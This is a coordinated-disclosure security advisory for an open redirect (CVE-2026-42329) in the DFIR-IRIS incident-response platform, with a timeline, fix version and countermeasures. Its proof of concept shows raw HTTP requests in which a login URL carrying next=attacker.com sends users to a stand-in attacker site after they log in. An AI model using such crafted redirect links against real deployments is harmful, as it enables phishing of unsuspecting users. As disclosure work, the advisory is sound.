# DFIR-IRIS Open Redirect #

## Vulnerability Overview ##

The IRIS web application contains a weakness where an attacker can misuse it
to redirect the user to a malicious website controlled by an attacker.

* **Identifier**            : SBA-ADV-20260126-02
* **Type of Vulnerability** : Open Redirect
* **Software/Product Name** : [IRIS](https://www.dfir-iris.org/)
* **Vendor**                : [DFIR-IRIS](https://github.com/dfir-iris)
* **Affected Versions**     : <= 2.4.27
* **Fixed in Version**      : v2.4.28
* **CVE ID**                : CVE-2026-42329
* **CVSS Vector**           : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N
* **CVSS Base Score**       : 4.7 (Medium)

## Vendor Description ##

> IRIS is a collaborative digital platform designed for incident response
> analysts to share complex investigations at a technical level. It can be
> installed on a dedicated server or as a portable application for roaming
> investigations where internet access might not be available.

Source: <https://docs.dfir-iris.org/2.4.24/>

## Impact ##

A user can be sent a trustworthy looking link point to an IRIS deployment,
but after opening it in the browser will get redirected to a malicious
website controlled by the attacker. This facilitates phishing attacks.

## Vulnerability Description ##

Open Redirect vulnerabilities arise when the web application uses some form
of redirects (HTTP Redirects, JavaScript Redirects) and due to insufficient
input validation, an attacker can change the redirect target to a different
(malicious) domain.

## Proof of Concept ##

If a user can be made to open a link to the login page with an added
parameter like `/login?next=attacker.com`, the standard authentication page
is shown to the user:

```http hl:1
GET /login?next=attacker.com HTTP/1.1
Host: myiris.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

HTTP/1.1 200 OK
Server: nginx
Date: Mon, 26 Jan 2026 13:56:59 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 4932
Connection: keep-alive
Vary: Cookie
Content-Security-Policy: default-src 'self' https://analytics.dfir-iris.org; script-src 'self' 'unsafe-inline' https://analytics.dfir-iris.org; style-src 'self' 'unsafe-inline'; img-src 'self' data:;
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000: includeSubDomains
Front-End-Https: on

<html>
[...]
```

And after a successful authentication, the user gets redirected to the target
website chosen by the attacker:

```http hl:28,42
POST /login?next=attacker.com HTTP/1.1
Host: myiris.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Origin: https://myiris.local
Referer: https://myiris.local/login?next=attacker.com
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

csrf_token=IjJlODY3YWI0NjY4MjUwOTJiMzJjYjUzZjkyZWY2ODRmMjlhNDY5NTgi.aWT9qw.Z9vNLn-B_z0Z1xKr4CRGOah-YY8&username=foo&password=bar

HTTP/1.1 302 FOUND
Server: nginx
Date: Mon, 26 Jan 2026 13:57:04 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 225
Connection: keep-alive
Location: attacker.com?cid=1
Vary: Cookie
Set-Cookie: session=.eJwtTkluwzAM_ErAXl2Aonafe-krDC0karSxA8k5Bfl75TYncgazPWCRxv0L5qPdeYJlrTBDQhJSURxZEzCYbCwbzBE91ahTDAq5emNSUUG5mqsOVYsio4UCKkfIVlCwhOyHK4RKlSSVmBwpMeS9kmy0NVgHpxLnktFzKKOGETWMIffO7X8NDVh6k-XYv3k7CQ7Op2ycC2QxUtZUstUSicUFIxSTcdGG03dvjbdjKakzzA8471-qml7_JvuIhBfc0nXo4E1d3i-f23qs6efywdcdnhPcuF3X3td96zDjBOfCl_52KHj-AjyeYVM.aWT9sA.a7kmSLN_RbLW15uwED81zY-Rd7o; Secure; HttpOnly; Path=/; SameSite=Lax
Content-Security-Policy: default-src 'self' https://analytics.dfir-iris.org; script-src 'self' 'unsafe-inline' https://analytics.dfir-iris.org; style-src 'self' 'unsafe-inline'; img-src 'self' data:;
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000: includeSubDomains
Front-End-Https: on

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="attacker.com?cid=1">attacker.com?cid=1</a>. If not, click the link.
```

## Recommended Countermeasures ##

We recommend updating to IRIS version 2.4.28 or later.

IRIS should apply the following countermeasures:

* If possible, avoid constructing redirect targets that contain user input.
* Otherwise, perform an input validation to make sure that only desired
redirect targets are possible.

## Timeline ##

* `2026-01-26` Identified the vulnerability in version 2.4.26
* `2026-01-30` Initial vendor contact via e-mail
* `2026-02-27` Second vendor contact via e-mail
* `2026-03-30` Report on GitHub due to a missing response from the vendor
* `2026-04-27` Version containing fix (v2.4.28) tagged by vendor
* `2026-04-27` GitHub assigned CVE-2026-42329
* `2026-05-04` Confirm fix for v2.4.28
* `2026-05-19` Public disclosure

## References ##

* OWASP Web Security Testing Guide (WSTG) v4.2. Testing for Client-side URL
  Redirect:
  <https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect>
* Common Weakness Enumeration. CWE-601 URL Redirection to Untrusted Site
  ('Open Redirect'): <https://cwe.mitre.org/data/definitions/601.html>
* OpenCRE. CRE: 232-217 Whitelist redirected/forwarded URLs:
  <https://opencre.org/cre/232-217>

## Credits ##

* Michael Koppmann ([SBA Research](https://www.sba-research.org/))
* Mathias Tausig ([SBA Research](https://www.sba-research.org/))

The discovery of this vulnerability was made possible through support from
[CYSSDE](https://cyssde.eu/) and the European Union.

![CYSSDE](images/cyssde.png)
